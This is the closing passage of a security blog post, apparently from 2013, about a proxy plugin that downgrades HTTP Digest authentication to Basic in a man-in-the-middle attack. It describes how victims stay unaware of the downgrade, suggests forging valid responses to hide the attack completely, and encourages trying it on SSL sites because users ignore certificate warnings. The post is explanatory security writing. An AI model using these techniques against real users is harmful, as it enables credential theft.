<p><img src="http://i.imgur.com/NQFboBV.png"></p>

<h3>What is the user experience with this?</h3>

<p>That is a good question. The actual dialog that the user sees, again, is up to the browser to render. Depending on <strong>which</strong> browser you use on <strong>which</strong> OS, this may look different. In the back, the client <em>should</em> function normally, blissfully unaware that the headers for stronger authentication were swapped out.</p>

<p>On my computer, the authentication dialog has the follow look and feel:</p>

<p><img src="http://i.imgur.com/9NTWg0W.png"></p>

<p>Notice the &ldquo;Server Says:&rdquo; Section. This is typically the <code>realm</code> part of the authentication request. When using the <code>dtob.py</code> plugin, it is changed to <code>pwnd</code>. This dialog looks no different when using any form of HTTP based authentication. Hence, when the downgrade attack occurs, the user is unaware that anything different is happening in the background.</p>

<h3>To wrap it up</h3>

<p>A few things to note here. Regardless of the HTTP Authentication method used, the client will not know <em>which</em> authentication method is actually being used without inspecting the headers etc. The plugin can technically be written to keep track of which URL&rsquo;s require Digest auth, and prepare valid responses ( like the one we did in the shell ) and present that back to the server. This will make the process completely smooth and the client unaware that something is going on. In the plugins current state, it will just continuously prompt the user for authentication as the proper request with the correct <code>Authorisation</code> header is never sent to the server.</p>

<p>On the case of SSL websites it obviously gets a little more tricky. Don&rsquo;t be put off with this. <strong>Countless</strong> times have I seen where users simply click the &ldquo;proceed anyways&rdquo; button regardless of the certificate validation errors that the browser presents them with. So, even though you will raise alarms on SSL encrypted websites, its still worth a try ^^</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>

      








  


<time datetime="2013-06-25T18:52:00+02:00" pubdate data-updated="true">Jun 25<sup>th</sup>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/basic-authentication/'>basic authentication</a>, <a class='category' href='/blog/categories/digest-authentication/'>digest authentication</a>, <a class='category' href='/blog/categories/mitm/'>mitm</a>, <a class='category' href='/blog/categories/proxy/'>proxy</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2013/06/23/quick-win-quickly-execute-last-shell-command/" title="Previous Post: Quick Win: Quickly Execute Last Shell Command">&laquo; Quick Win: Quickly Execute Last Shell Command</a>
      
      
        <a class="basic-alignment right" href="/blog/2013/07/27/stuff-to-gource/" title="Next Post: 'stuff' to Gource.">'stuff' to Gource. &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>About Me</h1>
  <br>
  <p>
    <a href="https://leonjza.github.io/about/">Another caffeine fueled security guy.</a>
 </p>
</section>
<section>
 <p>
    <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="https://i.imgur.com/Ew3ZXtn.png"></a>
 </p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/">no more jailbreak detection - an adventure into Android app reversing and smali patching</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/23/hoof-to-root-solving-pegasus-1/">hoof to root ? - solving pegasus 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">playing in the playground - a offsec virtual pentesting labs review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/22/trying-harder-oscp-and-me/">trying harder - oscp and me</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/09/solving-kvasir-netcat-edition/">solving kvasir - netcat edition</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
